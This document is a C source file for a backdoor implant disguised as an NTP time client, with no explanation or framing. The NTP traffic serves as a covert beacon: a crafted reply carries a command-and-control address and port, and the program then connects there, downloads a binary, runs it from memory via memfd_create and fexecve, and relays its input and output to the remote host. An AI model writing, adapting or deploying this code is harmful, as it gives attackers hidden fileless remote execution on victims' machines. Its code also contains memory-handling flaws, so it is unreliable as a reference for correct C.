//#define NTP_SERVER "XXX.XXX.XXX.XXX"
#define NTP_SERVER "127.0.0.1"
//#define NTP_PORT 12345
#define NTP_PORT 123
#define ID 54321

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>


#define NTP_TIMESTAMP_DELTA 2208988800ull

int main() {
    int sock_fd;
    struct sockaddr_in servaddr;
    char buffer[48];
    time_t t;
    unsigned int delta;
    int a;

    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr=inet_addr(NTP_SERVER);
    servaddr.sin_port=htons(NTP_PORT);

    while (1) {
        memset(buffer, 0, 48);
        buffer[0] = 0xe3;

        a = ID;
        delta = (unsigned int)time(NULL) + NTP_TIMESTAMP_DELTA;
        *(unsigned int *)(buffer + 40) = htonl(delta);
        *(unsigned int *)(buffer + 44) = a ^ delta;

        sendto(sock_fd, buffer, 48, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
        recvfrom(sock_fd, buffer, 48, 0, NULL, NULL);

        a = buffer[47] ^ buffer[46] ^ buffer[45] ^ buffer[44];

        if (a) {
            if (fork()) {
                char c2_ip[16];
                sprintf(c2_ip, "%u.%u.%u.%u", buffer[12], buffer[13], buffer[14], buffer[15]);

                printf("Spawning session handler to %s:%d\n", c2_ip, ntohl(*((int*)(buffer + 4))));

                sock_fd = socket(AF_INET, SOCK_STREAM, 0);
                socklen_t servaddr_len = sizeof(servaddr);
                servaddr.sin_family = AF_INET;
                servaddr.sin_port = htons(ntohl(*((int*)(buffer + 4))));
                servaddr.sin_addr.s_addr = inet_addr(c2_ip);
                connect(sock_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));

                // Check in with ID
                a = ID;
                sendto(sock_fd, &a, 4, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));

                // Receive initial packet
                int header[2];
                recvfrom(sock_fd, header, 8, 0, (struct sockaddr *)&servaddr, &servaddr_len);

                // Allocate buffers
                char *args = malloc(header[0]);
                char *bin = malloc(header[1]);

                // Receive args
                recvfrom(sock_fd, args, header[0], 0, (struct sockaddr *)&servaddr, &servaddr_len);

                // Receive binary
                a = header[1];
                while (a > 1024) {
                    recvfrom(sock_fd, bin, 1024, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                    a -= 1024;
                    bin += 1024;
                }
                recvfrom(sock_fd, bin, a, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                bin -= (header[1] - a);

                // Create binary in memory
                a = memfd_create("0", 0);
                write(a, bin, header[1]);

                // Parse args
                char** argv = malloc(sizeof(char*));
                int b = 0;
                char *p = strtok(args, " ");
                while (p != NULL) {
                    argv[b] = malloc(strlen(p) + 1);
                    strcpy(argv[b], p);
                    argv = realloc(argv, sizeof(char*) * (++b)); 
                    p = strtok (NULL, " ");
                }

                // Create pipes for stdin/stdout to be redirected to socket
                int stdin_pipe[2];
                int stdout_pipe[2];
                pipe(stdin_pipe);
                pipe(stdout_pipe);

                // Fork the process - exec section
                int child_pid = fork();
                if (!child_pid) {
                    close(stdin_pipe[1]);
                    close(stdout_pipe[0]);
                    dup2(stdin_pipe[0], 0);
                    dup2(stdout_pipe[1], 1);
                    dup2(stdout_pipe[1], 2);
                    fexecve(a, argv, argv);
                    close(sock_fd);
                    kill(child_pid, SIGKILL);
                } else {
                    close(stdin_pipe[0]);
                    close(stdout_pipe[1]);
                    if (fork()) {
                        char pipe_buf[1024];
                        int buf_len = 0;
                        while (1) {
                            // Send data
                            buf_len = read(stdout_pipe[0], pipe_buf, 1024);
                            pipe_buf[buf_len] = 0;
                            sendto(sock_fd, pipe_buf, buf_len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
                        }
                    } else {
                        char pipe_buf[1024];
                        int buf_len = 0;
                        while (1) {
                            // Receive data
                            buf_len = recvfrom(sock_fd, pipe_buf, 1024, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                            write(stdin_pipe[1], pipe_buf, buf_len);
                        }
                    }
                }
            } else {
                sleep(1);
                continue;
            }
            break;
        }
        sleep((2 << (unsigned char)buffer[2]));
    }
    return 0;
}